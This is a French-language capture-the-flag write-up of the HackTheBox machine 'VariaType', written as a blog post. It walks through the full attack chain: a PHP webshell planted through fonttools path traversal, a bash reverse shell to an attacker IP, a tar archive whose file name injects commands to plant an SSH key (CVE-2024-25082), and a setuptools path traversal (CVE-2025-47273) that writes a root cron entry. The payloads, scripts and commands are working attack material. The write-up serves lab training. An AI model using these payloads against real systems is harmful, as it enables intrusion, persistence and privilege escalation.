---
title: "HackTheBox - VariaType"
date: 2026-03-16 16:01:00 +0200
categories: [HackTheBox, Challenge, Medium]
tags: [fontforge, path-traversal, cve-2024-25082, cve-2025-47273, setuptools, tar-injection, arbitrary-write, command-injection, linux]
description: "Write-up de la machine VariaType — Path traversal dans fonttools pour écrire un webshell PHP, CVE-2024-25082 sur FontForge pour pivoter vers steve via injection de commande dans un tar, puis CVE-2025-47273 dans setuptools pour escalader en root via écriture arbitraire dans /etc/cron.d"
image:
  path: /assets/img/posts/variatype/variatype.png
  alt: "HackTheBox - VariaType"
---

## Informations sur la machine

| Propriété      | Valeur                              |
| -------------- | ----------------------------------- |
| **OS**         | Linux                               |
| **Difficulté** | Medium                              |
| **IP**         | 10.129.12.182                       |
| **Domaines**   | variatype.htb, portal.variatype.htb |

---

## Outils utilisés

| Outil          | Rôle                                          |
| -------------- | --------------------------------------------- |
| **nmap**       | Scan de ports et détection de services        |
| **ffuf**       | Enumération de sous-domaines                  |
| **git-dumper** | Extraction du dépôt .git exposé               |
| **curl**       | Interactions avec les endpoints web           |
| **pspy64**     | Surveillance des processus et crons           |
| **python3**    | Création de TTF minimaux et tars malveillants |

---

## Reconnaissance

### Scan initial
```bash
nmap -sC -sV 10.129.12.182
```

Deux ports ouverts : **22** (SSH) et **80** (nginx).

### Enumération web

L'entrée `variatype.htb` pointe vers une application Flask proposant un outil de génération de polices variables. L'endpoint principal est `/tools/variable-font-generator` qui accepte un fichier `.designspace` et des fichiers maîtres `.ttf`/`.otf`.

Enumération des sous-domaines avec ffuf :
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://variatype.htb -H "Host: FUZZ.variatype.htb" \
     -fw 1
```

Découverte de `portal.variatype.htb` — un portail PHP de soumission de polices.

---

## Foothold — Arbitrary Write via fonttools path traversal

### Analyse du mécanisme de génération

L'application Flask (`/opt/variatype/app.py`) traite les fichiers `.designspace` uploadés via `fonttools varLib`. La commande exécutée est :
```python
subprocess.run(
    ['fonttools', 'varLib', 'config.designspace'],
    cwd=workdir,
    check=True,
    timeout=30
)
```

Le fichier de sortie est ensuite copié à la destination spécifiée dans le `.designspace` par `shutil.copy2`. L'attribut `filename` de la balise `<variable-font>` n'est pas sanitisé, permettant un **path traversal**.

### Découverte de l'injection CDATA

Le contenu de l'attribut `<labelname>` d'un axe est recopié dans le fichier de sortie généré par fonttools. En utilisant la syntaxe CDATA XML, on peut injecter du contenu arbitraire dans ce fichier.

### Construction du payload

Fichier `shell.designspace` :
```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="PwnFont"
      filename="../../../../../../var/www/portal.variatype.htb/public/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

Upload via le formulaire avec deux TTF minimaux valides. Le fichier `shell.php` est créé dans la racine du portail.

### Shell www-data
```bash
curl 'http://portal.variatype.htb/shell.php?cmd=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell
curl 'http://portal.variatype.htb/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.134/4444+0>%261"'
```

---

## Enumération interne

### Extraction du dépôt .git exposé

Le portail expose un répertoire `.git` dans `/var/www/portal.variatype.htb/public/`. Lecture des entrées Git :
```bash
cat /var/www/portal.variatype.htb/public/.git/config
```

Credentials récupérées : `gitbot:G1tB0t_Acc3ss_2025!`

### Application Flask

Lecture de `/opt/variatype/app.py` — secret key Flask, structure des routes, dossier d'upload (`/tmp/variabype_uploads`), dossier de sortie (`/var/www/portal.variatype.htb/public/files`).

### Cron job de steve

Surveillance avec pspy64 :
```
UID=1000  PID=XXXX | /bin/bash /home/steve/bin/process_client_submissions.sh
```

Lecture du script de backup `/opt/process_client_submissions.bak` :
```bash
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
# ...
for file in $ext; do
    # ...
    timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
font = fontforge.open('$file')
# ..."
```

Le script accepte `*.ttf`, `*.otf`, `*.woff`, `*.woff2`, `*.zip`, `*.tar`, `*.tar.gz`, `*.sfd`. Il est exécuté depuis `$UPLOAD_DIR` et le nom de fichier `$file` est interpolé directement dans le code Python.

---

## Pivot vers steve — CVE-2024-25082 FontForge command injection

### Analyse de la vulnérabilité

**CVE-2024-25082** affecte FontForge ≤ 20230101. Lors de l'ouverture d'une archive `.tar`, FontForge parse le Table of Contents et passe le nom des fichiers internes directement à `system()` sans sanitisation dans `splinefont.c` :
```c
sprintf( listcommand, "%s %s %s > %s",
    archivers[i].unarchive,
    archivers[i].listargs,
    name,          // chemin de l'archive — chemin absolu, sûr
    listfile );

// Mais desiredfile (nom de fichier DANS le tar) est aussi passé à system() :
sprintf( unarchivecmd, "( cd %s ; %s %s %s %s ) > /dev/null",
    archivedir,
    archivers[i].unarchive,
    archivers[i].extractargs,
    name,
    doall ? "" : desiredfile );  // ← injection possible ici
```

### Construction du tar malveillant
```python
import tarfile, io

t = tarfile.open(
    '/var/www/portal.variatype.htb/public/files/evil.tar', 'w'
)
payload = (
    '; mkdir -p /home/steve/.ssh && '
    "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...' "
    '>> /home/steve/.ssh/authorized_keys && '
    'chmod 700 /home/steve/.ssh && '
    'chmod 600 /home/steve/.ssh/authorized_keys ;test.ttf'
)
info = tarfile.TarInfo(name=payload)
info.size = 0
t.addfile(info, io.BytesIO(b''))
t.close()
```

Le nom du fichier dans le tar contient la commande. Quand FontForge construit `unarchivecmd`, le shell interprète les `;` et exécute notre payload.

### Attente du cron et connexion SSH
```bash
# Génération de la clé SSH en local
ssh-keygen -t ed25519 -f /tmp/steve_key -N ""

# Après le passage du cron (UID=1000) :
ssh -i /tmp/steve_key steve@10.129.12.182
```

---

## Privilege Escalation — CVE-2025-47273 setuptools arbitrary write

### Sudo rule
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Le script `/opt/font-tools/install_validator.py` utilise `setuptools.package_index.PackageIndex().download()` pour télécharger un plugin Python depuis une URL HTTP.

### Analyse de la vulnérabilité

**CVE-2025-47273** affecte setuptools < 78.1.1. Dans `PackageIndex._download_url()` :
```python
name, _fragment = egg_info_for_url(url)
# name = urllib.parse.unquote(path.split('/')[-1])
# Si l'URL contient %2F (slash encodé), unquote() le décode en /
# donnant un name qui commence par / (chemin absolu)

filename = os.path.join(tmpdir, name)
# os.path.join() ignore tmpdir si name commence par /
# → le fichier est écrit à l'emplacement absolu name
```

### Exploitation

Serveur HTTP local servant le payload cron :
```python
# evil_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'* * * * * root chmod u+s /bin/bash\n')

HTTPServer(('0.0.0.0', 8089), Handler).serve_forever()
```

L'URL avec `%2F` encodés dans le path force l'écriture dans `/etc/cron.d/evil` :
```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
    "http://10.10.15.134:8089/%2Fetc%2Fcron.d%2Fevil#egg=evil-1.0"

# Après 1 minute :
/bin/bash -p
whoami  # root
```

---

## Flags
```bash
cat /home/steve/user.txt
cat /root/root.txt
```

---

## Récapitulatif de la chaîne d'exploitation
```
variatype.htb /tools/variable-font-generator
  │
  └─ CDATA injection + path traversal fonttools
      └─ Écriture de shell.php dans portal.variatype.htb/public/
          └─ RCE www-data
              │
              └─ .git exposé → gitbot:G1tB0t_Acc3ss_2025!
              └─ Cron steve → FontForge sur /files/*.tar
                  │
                  └─ CVE-2024-25082 : tar avec nom de fichier injecté
                      └─ SSH key ajoutée dans /home/steve/.ssh/authorized_keys
                          └─ SSH steve@variatype
                              │
                              └─ sudo install_validator.py (root, NOPASSWD)
                                  └─ CVE-2025-47273 : setuptools %2F path traversal
                                      └─ Écriture dans /etc/cron.d/evil
                                          └─ SUID bash → root ✓
```

---

## Ressources

- [CVE-2024-25082 — FontForge command injection via archives](https://nvd.nist.gov/vuln/detail/CVE-2024-25082)
- [CVE-2025-47273 — setuptools PackageIndex path traversal](https://github.com/advisories/GHSA-5rjg-fvgr-3xxf)
- [fonttools varLib documentation](https://fonttools.readthedocs.io/en/latest/varLib/index.html)

---

## Leçons apprises

- **Lire le code source avant de chercher des modules hijackables** — on a passé beaucoup de temps à tenter de hijacker des modules Python (sitecustomize, jaraco, apport_python_hook) alors que le vecteur réel était une CVE documentée dans FontForge. Lire les sources C de FontForge en cherchant `system()` aurait mené directement à CVE-2024-25082
- **Le path traversal fonttools nécessite que les dossiers intermédiaires existent** — `shutil.copy2` ne crée pas les dossiers parents. Le webshell PHP a fonctionné parce que `/var/www/portal.variatype.htb/public/` existait déjà
- **`%2F` dans les URLs contourne `os.path.join()`** — `urllib.parse.unquote()` décode les slashes encodés avant que `os.path.join()` soit appelé, rendant le `tmpdir` inopérant si le nom résultant commence par `/`

**Machine complétée**

{% include comments.html %}